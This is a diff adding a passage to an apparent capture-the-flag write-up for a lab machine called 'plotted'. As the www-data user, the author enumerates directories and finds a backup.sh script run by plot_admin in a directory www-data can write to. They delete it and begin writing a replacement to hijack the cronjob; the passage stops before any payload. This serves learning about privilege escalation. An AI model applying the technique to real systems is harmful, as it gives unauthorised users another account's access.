@@ -537,4 +537,38 @@ Since user frequently reuse the same passwords across different services on a Li
 
 As we already discovered two valid SSH users earlier: plot_admin and ubuntu we can try to log into the SSH service on the target machine from our attacking terminal using the password we just found.
 
-// I will get back to this!!!
+Hours passed and I tried every username with every password and none of them would work, which led me to the conclusion that we actually have to find some other way to get the necessary permissions. There may are alternative lateral movement paths or local enumeration details I might have missed. The current user is www-data (the web server user). I desperately listed every directory in the hopes of finding something interesting and actually made a huge discovery.
+
+```
+www-data@plotted:/$ ls -la /var/www
+total 16
+drwxr-xr-x  4 root     root     4096 Oct 28  2021 .
+drwxr-xr-x 14 root     root     4096 Oct 28  2021 ..
+drwxr-xr-x  4 root     root     4096 Oct 28  2021 html
+drwxr-xr-x  2 www-data www-data 4096 Oct 28  2021 scripts
+```
+
+Seeing the html directory is to be expected. What is unnatural is the scripts directory, which sticks out like a sore thumb. 
+
+```
+www-data@plotted:/$ ls -la /var/www/scripts
+total 12
+drwxr-xr-x 2 www-data   www-data   4096 Oct 28  2021 .
+drwxr-xr-x 4 root       root       4096 Oct 28  2021 ..
+-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh
+www-data@plotted:/$ cat /var/www/scripts/backup.sh   
+#!/bin/bash
+
+/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
+/bin/chmod -R 770 /home/plot_admin/tms_backup/management
+```
+
+The script is designed to create a backup of a web application folder and then enforce strict access control permissions on that backup.
+
+As this seems to be a cronjob we decide to replace the script.
+
+```
+www-data@plotted:/$ rm /var/www/scripts/backup.sh
+rm: remove write-protected regular file '/var/www/scripts/backup.sh'? yes
+www-data@plotted:/$ echo '#!/bin/bash' > /var/www/scripts/backup.sh
+```
